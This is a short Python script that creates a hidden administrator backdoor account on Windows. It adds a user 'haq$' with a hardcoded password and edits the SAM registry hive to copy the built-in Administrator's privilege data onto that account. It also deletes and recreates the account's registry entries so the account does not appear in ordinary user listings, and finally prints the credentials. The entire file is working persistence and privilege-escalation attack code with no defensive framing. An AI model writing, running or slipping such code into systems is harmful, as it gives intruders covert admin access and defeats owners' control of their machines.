#author:九世
#time:2019/3/30

import winreg
import os

class Yin:
    def net_add(self):
        jg=os.popen('net user haq$ haq5201314 /add')
        print(jg.read())

    def del_user(self):
        yk=os.popen('net user haq$ /del')
        print(yk.read())

    def reg_add(self):
        self.net_add()

        user=[]

        user_lists=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\Names',0,winreg.KEY_ALL_ACCESS)
        contey=winreg.QueryInfoKey(user_lists)[0]
        for r in range(int(contey)):
            name=winreg.EnumKey(user_lists,r)
            user.append(name)

        rid_list=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\Names\haq$',0,winreg.KEY_ALL_ACCESS)
        cx_g=winreg.QueryValueEx(rid_list,'')
        cx_rid=cx_g[1]
        cx_hex='00000{}'.format(str(hex(cx_rid)).replace('0x',''))

        rid_list_administrator=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\000001F4',0,winreg.KEY_ALL_ACCESS)
        administrator_dk=winreg.QueryValueEx(rid_list_administrator,'F')
        administrator_zhi= administrator_dk[0]

        haq_opens=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\{}'.format(cx_hex),0,winreg.KEY_ALL_ACCESS)
        haq_v=winreg.QueryValueEx(haq_opens,'V')
        hv_q=haq_v[0]

        self.del_user()

        xj_user=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\Names',0,winreg.KEY_ALL_ACCESS)
        winreg.CreateKey(xj_user,'haq$')

        haq_user=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\Names\haq$',0,winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(haq_user, '', 1,cx_rid,None)

        xj_rid=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users',0,winreg.KEY_ALL_ACCESS)
        winreg.CreateKey(xj_rid,cx_hex.upper())

        rid_list_haq=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SAM\SAM\Domains\Account\Users\{}'.format(cx_hex),0,winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(rid_list_haq,'',1,winreg.REG_SZ,'')
        winreg.SetValueEx(rid_list_haq,'F',1,winreg.REG_BINARY,administrator_zhi)
        winreg.SetValueEx(rid_list_haq, 'V', 1, winreg.REG_BINARY, hv_q)

        print('[+] 创建隐藏用户完成')
        print('[+] username:haq$ password:haq5201314')

if __name__ == '__main__':
    obj=Yin()
    obj.reg_add()
